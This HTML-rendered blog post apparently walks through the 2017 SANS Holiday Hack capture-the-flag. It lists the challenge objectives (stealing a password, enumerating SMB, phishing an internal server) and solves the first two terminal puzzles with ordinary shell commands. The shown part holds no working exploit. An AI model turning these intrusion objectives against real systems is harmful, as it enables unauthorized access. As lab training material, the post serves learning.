&lt;li&gt;&lt;a class="reference internal" href="#north-pole-christmas-town-infrastructure-elf-database" id="id58"&gt;North Pole Christmas Town infrastructure: Elf Database&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#answers-to-the-questions" id="id59"&gt;Answers to the questions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#conclusion" id="id60"&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="introduction"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id16"&gt;Introduction&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;We're greeted by Sam the Snowman, who exposes the situation to us. The North
Pole is under siege, attacked by giant falling snowballs, and an
Inter-Dimensional Tornado, that shredded &lt;em&gt;The Great Book&lt;/em&gt;. This book tells the
epic story of the elves. Our mission is to redirect the falling snowballs,
find out who is behind all this, and recover the missing seven pages of &lt;em&gt;The
Great Book&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Here are the questions we must answer:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;&lt;cite&gt;Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?&lt;/cite&gt;&lt;/li&gt;
&lt;li&gt;&lt;cite&gt;Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?&lt;/cite&gt;&lt;/li&gt;
&lt;li&gt;&lt;cite&gt;The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?&lt;/cite&gt;&lt;/li&gt;
&lt;li&gt;&lt;cite&gt;Elf Web Access (EWA. is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?&lt;/cite&gt;&lt;/li&gt;
&lt;li&gt;&lt;cite&gt;How many infractions are required to be marked as naughty on Santa's Naughty and Nice List? What are the names of at least six insider threat moles?  Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?&lt;/cite&gt;&lt;/li&gt;
&lt;li&gt;&lt;cite&gt;The North Pole engineering team has introduced an Elf as a Service (EaaS.  platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?&lt;/cite&gt;&lt;/li&gt;
&lt;li&gt;&lt;cite&gt;Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI. to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from C:\GreatBookPage7.pdf. What does The Great Book page describe?&lt;/cite&gt;&lt;/li&gt;
&lt;li&gt;&lt;cite&gt;Fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com. Who wrote the letter?&lt;/cite&gt;&lt;/li&gt;
&lt;li&gt;&lt;cite&gt;Which character is ultimately the villain causing the giant snowball problem. What is the villain's motive?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This challenge is divided into two targets:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;The North Pole Christmas Town infrastructure, which includes the Letters To
Santa application, and the internal 10.142.0.0/24 network.&lt;/li&gt;
&lt;li&gt;The &lt;a class="reference external" href="https://2017.holidayhackchallenge.com/"&gt;North Pole and Beyond&lt;/a&gt;, where
we have to redirect falling snowballs. These levels also have Cranberry Pi
terminal with challenges to solve. Solving these challenges gives us objects
to redirect the falling snowballs, and hints to the exploitation of the North
Pole Christmas Town infrastructure. Hints are also available for the
Cranberry Pi terminal challenges, on the Twitter accounts of the different
elves.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now I know that hints can be helpful, but it's more fun to try and figure out
how to solve the different challenges our own way. So:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;We won't use the Twitter profiles to solve the Cranberry Pi challenges.&lt;/li&gt;
&lt;li&gt;I'll post the solutions to the Cranberry Pi challenges, but we won't use the
hints that are given after solving.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;As usual, I'll try to detail my thought process as much as possible, including
dead-ends and mistakes (that's the best way to learn).&lt;/p&gt;
&lt;p&gt;Sounds good? Great (plus, you don't really have a say)!&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="first-page-of-the-great-book"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id17"&gt;First page of &lt;em&gt;The Great Book&lt;/em&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="north-pole-and-beyond-winter-wonder-landing"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id18"&gt;North Pole and Beyond: Winter Wonder Landing&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;The first page is available in the North Pole and Beyond, in the level &lt;strong&gt;Winter
Wonder Landing&lt;/strong&gt;. We must use the giant falling snowball to get the first page.
But let's first solve the Cranberry Pi challenge.&lt;/p&gt;
&lt;div class="section" id="cranberry-pi-yannick-s-dirty-solution"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id19"&gt;Cranberry Pi: Yannick's (dirty) solution&lt;/a&gt;&lt;/h4&gt;
&lt;pre class="literal-block"&gt;
                                 |
                               \ ' /
                             -- (*) --
                                &amp;gt;*&amp;lt;
                               &amp;gt;0&amp;lt;&amp;#64;&amp;lt;
                              &amp;gt;&amp;gt;&amp;gt;&amp;#64;&amp;lt;&amp;lt;*
                             &amp;gt;&amp;#64;&amp;gt;*&amp;lt;0&amp;lt;&amp;lt;&amp;lt;
                            &amp;gt;*&amp;gt;&amp;gt;&amp;#64;&amp;lt;&amp;lt;&amp;lt;&amp;#64;&amp;lt;&amp;lt;
                           &amp;gt;&amp;#64;&amp;gt;&amp;gt;0&amp;lt;&amp;lt;&amp;lt;*&amp;lt;&amp;lt;&amp;#64;&amp;lt;
                          &amp;gt;*&amp;gt;&amp;gt;0&amp;lt;&amp;lt;&amp;#64;&amp;lt;&amp;lt;&amp;lt;&amp;#64;&amp;lt;&amp;lt;&amp;lt;
                         &amp;gt;&amp;#64;&amp;gt;&amp;gt;*&amp;lt;&amp;lt;&amp;#64;&amp;lt;&amp;gt;*&amp;lt;&amp;lt;0&amp;lt;*&amp;lt;
           \*/          &amp;gt;0&amp;gt;&amp;gt;*&amp;lt;&amp;lt;&amp;#64;&amp;lt;&amp;gt;0&amp;gt;&amp;lt;&amp;lt;*&amp;lt;&amp;#64;&amp;lt;&amp;lt;
       ___\\U//___     &amp;gt;*&amp;gt;&amp;gt;&amp;#64;&amp;gt;&amp;lt;0&amp;lt;&amp;lt;*&amp;gt;&amp;gt;&amp;#64;&amp;gt;&amp;lt;*&amp;lt;0&amp;lt;&amp;lt;
       |\\ | | \\|    &amp;gt;&amp;#64;&amp;gt;&amp;gt;0&amp;lt;*&amp;lt;0&amp;gt;&amp;gt;&amp;#64;&amp;lt;&amp;lt;0&amp;lt;&amp;lt;&amp;lt;*&amp;lt;&amp;#64;&amp;lt;&amp;lt;
       | \\| | _(UU)_ &amp;gt;((*))_&amp;gt;0&amp;gt;&amp;lt;*&amp;lt;0&amp;gt;&amp;lt;&amp;#64;&amp;lt;&amp;lt;&amp;lt;0&amp;lt;*&amp;lt;
       |\ \| || / //||.*.*.*.|&amp;gt;&amp;gt;&amp;#64;&amp;lt;&amp;lt;*&amp;lt;&amp;lt;&amp;#64;&amp;gt;&amp;gt;&amp;lt;0&amp;lt;&amp;lt;&amp;lt;
       |\\_|_|&amp;amp;&amp;amp;_// ||*.*.*.*|_\\db//_
       &amp;quot;&amp;quot;&amp;quot;&amp;quot;|'.'.'.|~~|.*.*.*|     ____|_
           |'.'.'.|   ^^^^^^|____|&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;|
           ~~~~~~~~         '&amp;quot;&amp;quot;&amp;quot;&amp;quot;`------'
My name is Bushy Evergreen, and I have a problem for you.
I think a server got owned, and I can only offer a clue.
We use the system for chat, to keep toy production running.
Can you help us recover from the server connection shunning?
Find and run the elftalkd binary to complete this challenge.
elf&amp;#64;3b92caa92835:~$
&lt;/pre&gt;
&lt;p&gt;Ok, so we just have to find the &lt;code&gt;elftalkd&lt;/code&gt; binary and launch it, easy
enough:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@2849ef63a77a:~$&lt;/span&gt; find / -name elftalkd
&lt;span class="go"&gt;bash: /usr/local/bin/find: cannot execute binary file: Exec format error&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmm, &lt;code&gt;find&lt;/code&gt; doesn't work, dammit. We can try to execute a
&lt;code&gt;ls -lR /&lt;/code&gt;, however this does not give us the full path to the listed
files:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@2849ef63a77a:/$&lt;/span&gt; ls -lR /
&lt;span class="go"&gt;/:&lt;/span&gt;
&lt;span class="go"&gt;total 64&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x   2 root   root    4096 Nov 14 13:49 bin&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x   2 root   root    4096 Apr 12  2016 boot&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x   5 root   root     360 Dec 23 16:17 dev&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x   1 root   root    4096 Dec 23 16:17 etc&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x   1 root   root    4096 Dec  4 14:32 home&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x   8 root   root    4096 Sep 13  2015 lib&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x   2 root   root    4096 Nov 14 13:49 lib64&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x   2 root   root    4096 Nov 14 13:48 media&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x   2 root   root    4096 Nov 14 13:48 mnt&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x   2 root   root    4096 Nov 14 13:48 opt&lt;/span&gt;
&lt;span class="go"&gt;dr-xr-xr-x 292 nobody nogroup    0 Dec 23 16:17 proc&lt;/span&gt;
&lt;span class="go"&gt;drwx------   2 root   root    4096 Nov 14 13:49 root&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x   1 root   root    4096 Dec  4 14:32 run&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x   1 root   root    4096 Nov 17 21:59 sbin&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x   2 root   root    4096 Nov 14 13:48 srv&lt;/span&gt;
&lt;span class="go"&gt;dr-xr-xr-x  13 nobody nogroup    0 Dec 21 14:03 sys&lt;/span&gt;
&lt;span class="go"&gt;drwxrwxrwt   1 root   root    4096 Dec  4 14:32 tmp&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x   1 root   root    4096 Nov 14 13:48 usr&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x   1 root   root    4096 Nov 14 13:49 var&lt;/span&gt;
&lt;span class="go"&gt;/bin:&lt;/span&gt;
&lt;span class="go"&gt;total 7364&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 root root 1037528 May 16  2017 bash&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 root root   52080 Mar  2  2017 cat&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 root root   60272 Mar  2  2017 chgrp&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 root root   56112 Mar  2  2017 chmod&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 root root   64368 Mar  2  2017 chown&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 root root  151024 Mar  2  2017 cp&lt;/span&gt;
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;span class="go"&gt;/var/opt:&lt;/span&gt;
&lt;span class="go"&gt;total 0&lt;/span&gt;
&lt;span class="go"&gt;/var/spool:&lt;/span&gt;
&lt;span class="go"&gt;total 0&lt;/span&gt;
&lt;span class="go"&gt;lrwxrwxrwx 1 root root 7 Nov 14 13:48 mail -&amp;gt; ../mail&lt;/span&gt;
&lt;span class="go"&gt;/var/tmp:&lt;/span&gt;
&lt;span class="go"&gt;total 0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If I pipe this output to a &lt;code&gt;grep elftalkd&lt;/code&gt;, we can see that the file
exists:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@2849ef63a77a:/$&lt;/span&gt; ls -lR / &lt;span class="p"&gt;|&lt;/span&gt; grep elftalkd
&lt;span class="go"&gt;-rwxr-xr-x 1 root root 7385168 Dec  4 14:29 elftalkd&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;However, we don't have the parent folder. If we look at the full output of
&lt;code&gt;ls -lR&lt;/code&gt;, we can see that it has this form:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;/path/to/folder1&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 root root   52080 Mar  2  2017 file1_in_folder_1&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 root root   52080 Mar  2  2017 file2_in_folder_1&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 root root   52080 Mar  2  2017 file3_in_folder_1&lt;/span&gt;
&lt;span class="go"&gt;/path/to/folder2&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 root root   52080 Mar  2  2017 file1_in_folder_2&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 root root   52080 Mar  2  2017 file2_in_folder_2&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 root root   52080 Mar  2  2017 file3_in_folder_2&lt;/span&gt;
&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that we have the full path to the parent folder, and then, line by
line, the files contained in this folder. So, if I grep for lines starting
with &lt;code&gt;/&lt;/code&gt;, along with greping for &lt;code&gt;elftalkd&lt;/code&gt;, I'll get an output
like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;span class="go"&gt;/path/to/folder1&lt;/span&gt;
&lt;span class="go"&gt;/path/to/folder2&lt;/span&gt;
&lt;span class="go"&gt;/path/to/elftalkd&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 root root   52080 Mar  2  2017 elkftalkd&lt;/span&gt;
&lt;span class="go"&gt;/path/to/folder3&lt;/span&gt;
&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;However, the result will be lost in a list of folders, so I pipe my output
in another &lt;code&gt;grep&lt;/code&gt;, where I look for &lt;code&gt;elkftalkd&lt;/code&gt;. The &lt;code&gt;-B 1&lt;/code&gt;
option tells &lt;code&gt;grep&lt;/code&gt; to print the line before the matching line (which
should be the line with the parent folder to our program):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@2849ef63a77a:/$&lt;/span&gt; ls -lR / &lt;span class="p"&gt;|&lt;/span&gt; grep -E &lt;span class="s1"&gt;&amp;#39;^/|elftalkd&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep -B &lt;span class="m"&gt;1&lt;/span&gt; elftalkd
&lt;span class="go"&gt;/run/elftalk/bin:&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 root root 7385168 Dec  4 14:29 elftalkd&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now have the full path to our binary, &lt;code&gt;/run/elftalkd/bin/elftalkd&lt;/code&gt;.
We can now launch it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@2849ef63a77a:/$&lt;/span&gt; /run/elftalk/bin/elftalkd
&lt;span class="go"&gt;        Running in interactive mode&lt;/span&gt;
&lt;span class="go"&gt;        --== Initializing elftalkd ==--&lt;/span&gt;
&lt;span class="go"&gt;Initializing Messaging System!&lt;/span&gt;
&lt;span class="go"&gt;Nice-O-Meter configured to 0.90 sensitivity.&lt;/span&gt;
&lt;span class="go"&gt;Acquiring messages from local networks...&lt;/span&gt;
&lt;span class="go"&gt;--== Initialization Complete ==--&lt;/span&gt;
&lt;span class="go"&gt;      _  __ _        _ _       _&lt;/span&gt;
&lt;span class="go"&gt;     | |/ _| |      | | |     | |&lt;/span&gt;
&lt;span class="go"&gt;  ___| | |_| |_ __ _| | | ____| |&lt;/span&gt;
&lt;span class="go"&gt; / _ \ |  _| __/ _` | | |/ / _` |&lt;/span&gt;
&lt;span class="go"&gt;|  __/ | | | || (_| | |   &amp;lt; (_| |&lt;/span&gt;
&lt;span class="go"&gt; \___|_|_|  \__\__,_|_|_|\_\__,_|&lt;/span&gt;
&lt;span class="go"&gt;-*&amp;gt; elftalkd! &amp;lt;*-&lt;/span&gt;
&lt;span class="go"&gt;Version 9000.1 (Build 31337)&lt;/span&gt;
&lt;span class="go"&gt;By Santa Claus &amp;amp; The Elf Team&lt;/span&gt;
&lt;span class="go"&gt;Copyright (C) 2017 NotActuallyCopyrighted. No actual rights reserved.&lt;/span&gt;
&lt;span class="go"&gt;Using libc6 version 2.23-0ubuntu9&lt;/span&gt;
&lt;span class="go"&gt;LANG=en_US.UTF-8&lt;/span&gt;
&lt;span class="go"&gt;Timezone=UTC&lt;/span&gt;
&lt;span class="go"&gt;Commencing Elf Talk Daemon (pid=6021)... done!&lt;/span&gt;
&lt;span class="go"&gt;Background daemon...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="cranberry-pi-the-official-solution"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id20"&gt;Cranberry Pi: the &amp;quot;official&amp;quot; solution&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;After solving the Cranberry Pi challenge in my (dirty) way, I looked at &lt;a class="reference external" href="https://twitter.com/GreenestElf"&gt;Bushy
Evergreen's twitter profile&lt;/a&gt;.  In &lt;a class="reference external" href="https://twitter.com/GreenestElf/status/938165130906365952"&gt;this
tweet&lt;/a&gt;, he
mentions that someone replaced the &lt;code&gt;find&lt;/code&gt; executable with a wrong
version. Let's take a look at the &lt;code&gt;find&lt;/code&gt; executable on the console:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@2a00576f91ec:~$&lt;/span&gt; which find
&lt;span class="go"&gt;/usr/local/bin/find&lt;/span&gt;
&lt;span class="gp"&gt;elf@2a00576f91ec:~$&lt;/span&gt; file /usr/local/bin/find
&lt;span class="go"&gt;/usr/local/bin/find: ELF 64-bit LSB shared object, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=6ebee1b65b978900b5485&lt;/span&gt;
&lt;span class="go"&gt;2a2d1e698f911064ab3, stripped&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmm, the &lt;code&gt;find&lt;/code&gt; executable seems to be for an ARM processor. However,
we appear to be running on an Intel x64 processor:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@2a00576f91ec:~$&lt;/span&gt; uname -a
&lt;span class="go"&gt;Linux 2a00576f91ec 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;That's why we got the &lt;code&gt;Exec format error&lt;/code&gt; message when we tried to
execute it: it's not for the right architecture. Let's copy a x64 &lt;code&gt;find&lt;/code&gt;
executable to the machine. To do so, I base64-encoded the &lt;code&gt;find&lt;/code&gt; binary
from my system, pasted it to a file on the Cranberry Pi console, and then
decoded it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@2a00576f91ec:~$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAwHIAAAAAAABAAAAAAAAAAAhbAwAAAAAAAAAAAEAAOAAJ&lt;/span&gt;
&lt;span class="go"&gt;AEAAHQAcAAYAAAAFAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA+AEAAAAAAAD4AQAAAAAAAAgA&lt;/span&gt;
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;span class="go"&gt;AAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAPxZ&lt;/span&gt;
&lt;span class="go"&gt;AwAAAAAABgEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=&amp;quot; &amp;gt; ~/find.b64&lt;/span&gt;
&lt;span class="gp"&gt;elf@2a00576f91ec:~$&lt;/span&gt; base64 -d ~/find.b64 &amp;gt; ~/find
&lt;span class="gp"&gt;elf@2a00576f91ec:~$&lt;/span&gt; chmod +x ~/find
&lt;span class="gp"&gt;elf@2a00576f91ec:~$&lt;/span&gt; file ~/find
&lt;span class="go"&gt;/home/elf/find: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7079a38abca5fb9d188cc66bb15fb&lt;/span&gt;
&lt;span class="go"&gt;ec5e98f0f00, stripped&lt;/span&gt;
&lt;span class="gp"&gt;elf@2a00576f91ec:~$&lt;/span&gt; ~/find / -name elftalkd &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt; /dev/null
&lt;span class="go"&gt;/run/elftalk/bin/elftalkd&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="redirecting-the-snowball"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id21"&gt;Redirecting the snowball&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Now that we have completed the challenge, we get a new object to redirect our
snowballs: the Conveyor, that can redirect snowballs.&lt;/p&gt;
&lt;img alt="winter_wonder_landing_terminal.png" class="align-center" src="/images/sans-christmas-challenge-2017/winter_wonder_landing_terminal.png" /&gt;
&lt;p&gt;Here's the layout I used to redirect the snowball to the first page of &lt;em&gt;The
Great Book&lt;/em&gt; (Ok, this is dirty, but I didn't understand that if I clicked on
the conveyor, I could change its direction):&lt;/p&gt;
&lt;img alt="winter_wonder_landing_snowball.gif" class="align-center" src="/images/sans-christmas-challenge-2017/winter_wonder_landing_snowball.gif" /&gt;
&lt;p&gt;We now have the &lt;a class="reference external" href="/docs/sans-christmas-challenge-2017/GreatBookPage1.pdf"&gt;first page to The Great Book&lt;/a&gt;
(sha256: &lt;code&gt;b86eca1fdb8d1fb00c38cebfbca0989579c00b482343dff950310de0f8c77888&lt;/code&gt;):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;About This Book...&lt;/p&gt;
&lt;p&gt;This tome is the work of a successive group of anonymous scribes dedicated
to preserving the memory of the exceptional Little People of Oz so that
they'll go down in history. Over a span of several centuries, each author
has striven to capture the most important social, political, and
technological changes the Ozians have experienced from the happy golden
days of yore through today.&lt;/p&gt;
&lt;p&gt;Each and every author is dedicated to the goal of helping future
generations appreciate and understand the unique shared heritage of
merriment, mirth, and magnanimity characteristic of the Little People of
Oz. This book describes the good times they have shared. Also, it does
not shy away from recording the bad times they have suffered as well. Each
writer on this great multi-generational project attempts to record and
present the facts neutrally, without bias or opinion, uninfluenced as much
as possible by factionalism or the controversies of the day.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This North Pole and Beyond level doesn't have a North Pole Christmas Town
infrastructure level associated, so let's move on to the next page.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="second-page-of-the-great-book"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id22"&gt;Second page of &lt;em&gt;The Great Book&lt;/em&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Now the second page is not in the North Pole and Beyond level, but in the
North Pole Christmas Town infrastructure. But let's solve the NPaB challenge
first.&lt;/p&gt;
&lt;div class="section" id="north-pole-and-beyond-winconceivable-the-cliffs-of-winsanity"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id23"&gt;North Pole and Beyond: Winconceivable: The Cliffs of Winsanity&lt;/a&gt;&lt;/h3&gt;
&lt;div class="section" id="id1"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id24"&gt;Cranberry Pi: Yannick's (dirty) solution&lt;/a&gt;&lt;/h4&gt;
&lt;pre class="literal-block"&gt;
                ___,&amp;#64;
               /  &amp;lt;
          ,_  /    \  _,
      ?    \`/______\`/
   ,_(_).  |; (e  e) ;|
    \___ \ \/\   7  /\/    _\8/_
        \/\   \'=='/      | /| /|
         \ \___)--(_______|//|//|
          \___  ()  _____/|/_|/_|
             /  ()  \    `----'
            /   ()   \
           '-.______.-'
   jgs   _    |_||_|    _
        (&amp;#64;____) || (____&amp;#64;)
         \______||______/
My name is Sparkle Redberry, and I need your help.
My server is atwist, and I fear I may yelp.
Help me kill the troublesome process gone awry.
I will return the favor with a gift before nigh.

Kill the &amp;quot;santaslittlehelperd&amp;quot; process to complete this challenge.
&lt;/pre&gt;
&lt;p&gt;Ok, we need to kill the &lt;code&gt;santaslittlehelperd&lt;/code&gt; process. Weirdly enough,
the &lt;code&gt;kill&lt;/code&gt; command did not seem to have any effect on the process:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@cc2c61f5d274:~$&lt;/span&gt; ps aux &lt;span class="p"&gt;|&lt;/span&gt; grep santaslittlehelperd
&lt;span class="go"&gt;elf          8  0.0  0.0   4224   684 pts/0    S    17:02   0:00 /usr/bin/santaslittlehelperd&lt;/span&gt;
&lt;span class="go"&gt;elf        163  0.0  0.0  11284   944 pts/0    S+   17:04   0:00 grep --color=auto santaslittlehelperd&lt;/span&gt;
&lt;span class="gp"&gt;elf@cc2c61f5d274:~$&lt;/span&gt; &lt;span class="nb"&gt;kill&lt;/span&gt; -9 &lt;span class="m"&gt;8&lt;/span&gt;
&lt;span class="gp"&gt;elf@cc2c61f5d274:~$&lt;/span&gt; ps aux &lt;span class="p"&gt;|&lt;/span&gt; grep santaslittlehelperd
&lt;span class="go"&gt;elf          8  0.0  0.0   4224   684 pts/0    S    17:02   0:00 /usr/bin/santaslittlehelperd&lt;/span&gt;
&lt;span class="go"&gt;elf        171  0.0  0.0  11284   944 pts/0    S+   17:04   0:00 grep --color=auto santaslittlehelperd&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;However, killing the process in the &lt;code&gt;top&lt;/code&gt; program seemed to work:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;top - 17:05:09 up 2 days,  3:10,  0 users,  load average: 0.05, 0.12, 0.12&lt;/span&gt;
&lt;span class="go"&gt;Tasks:   6 total,   1 running,   5 sleeping,   0 stopped,   0 zombie&lt;/span&gt;
&lt;span class="gp"&gt;%&lt;/span&gt;Cpu&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;:  &lt;span class="m"&gt;0&lt;/span&gt;.0 us,  &lt;span class="m"&gt;0&lt;/span&gt;.7 sy,  &lt;span class="m"&gt;0&lt;/span&gt;.0 ni, &lt;span class="m"&gt;99&lt;/span&gt;.3 id,  &lt;span class="m"&gt;0&lt;/span&gt;.0 wa,  &lt;span class="m"&gt;0&lt;/span&gt;.0 hi,  &lt;span class="m"&gt;0&lt;/span&gt;.0 si,  &lt;span class="m"&gt;0&lt;/span&gt;.0 st
&lt;span class="go"&gt;KiB Mem : 14782588 total,  5738860 free,  1989032 used,  7054696 buff/cache&lt;/span&gt;
&lt;span class="go"&gt;KiB Swap:        0 total,        0 free,        0 used. 11804040 avail Mem&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;Send pid 8 signal [15/sigterm] 9&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND&lt;/span&gt;
&lt;span class="go"&gt;    8 elf       20   0    4224    684    612 S   0.0  0.0   0:00.00 santaslittlehel&lt;/span&gt;
&lt;span class="go"&gt;   11 elf       20   0   13528   6468   1488 S   0.0  0.0   0:00.09 kworker&lt;/span&gt;
